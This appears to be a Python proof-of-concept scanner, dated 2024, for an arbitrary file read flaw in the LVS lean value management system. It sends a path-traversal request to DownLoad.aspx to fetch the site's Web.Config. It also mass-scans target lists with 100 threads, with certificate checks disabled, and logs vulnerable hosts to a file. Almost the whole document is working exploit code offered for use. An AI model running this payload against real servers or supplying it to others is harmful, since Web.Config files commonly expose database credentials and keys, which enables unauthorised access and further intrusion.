import argparse
import requests
import os
import sys
import json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()



def banner():
    test = '''

 _______                                     __                                 __                                            
|       \                                   |  \                               |  \                                           
| $$$$$$$\  ______   __   __   __  _______  | $$       ______    ______    ____| $$     ______    _______   ______   __    __ 
| $$  | $$ /      \ |  \ |  \ |  \|       \ | $$      /      \  |      \  /      $$    |      \  /       \ /      \ |  \  /  \
| $$  | $$|  $$$$$$\| $$ | $$ | $$| $$$$$$$\| $$     |  $$$$$$\  \$$$$$$\|  $$$$$$$     \$$$$$$\|  $$$$$$$|  $$$$$$\ \$$\/  $$
| $$  | $$| $$  | $$| $$ | $$ | $$| $$  | $$| $$     | $$  | $$ /      $$| $$  | $$    /      $$ \$$    \ | $$  | $$  >$$  $$ 
| $$__/ $$| $$__/ $$| $$_/ $$_/ $$| $$  | $$| $$_____| $$__/ $$|  $$$$$$$| $$__| $$ __|  $$$$$$$ _\$$$$$$\| $$__/ $$ /  $$$$\ 
| $$    $$ \$$    $$ \$$   $$   $$| $$  | $$| $$     \\$$    $$ \$$    $$ \$$    $$|  \\$$    $$|       $$| $$    $$|  $$ \$$\
 \$$$$$$$   \$$$$$$   \$$$$$\$$$$  \$$   \$$ \$$$$$$$$ \$$$$$$   \$$$$$$$  \$$$$$$$ \$$ \$$$$$$$ \$$$$$$$ | $$$$$$$  \$$   \$$
                                                                                                          | $$                
                                                                                                          | $$                
                                                                                                           \$$                
                                                                                                                                                  
                                               author:sanhua
                                               ate:2024-09-19
                                               version:1.0
    '''
    print(test)


def poc(target):
    payload = "/Business/DownLoad.aspx?p=UploadFile/../Web.Config"
    url = target + payload
    try:
        r = requests.get(url, verify=False,timeout=5)
        if r.status_code == 200 and "点击下载" in r.text:
            print(f"{target} + 存在任意文件读取漏洞")
            with open("result.txt", "a",encoding='utf-8') as f:
                f.write(f"{target}存在任意文件读取漏洞 \n")
        else:
            print(f"{target} 不存在任意文件读取漏洞")
    except Exception as e:
        print(f"{target} 连接失败，原因：{e}")

def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        if not os.path.exists(args.file):
            print(f"[!] {args.file} 文件不存在，请检查路径")
            return
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                if url:  # 确保不添加空行
                    url_list.append(url)
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tLVS精益价值管理系统DownLoad.aspx存在任意文件读取漏洞.py -h")


if __name__ == '__main__':
    main()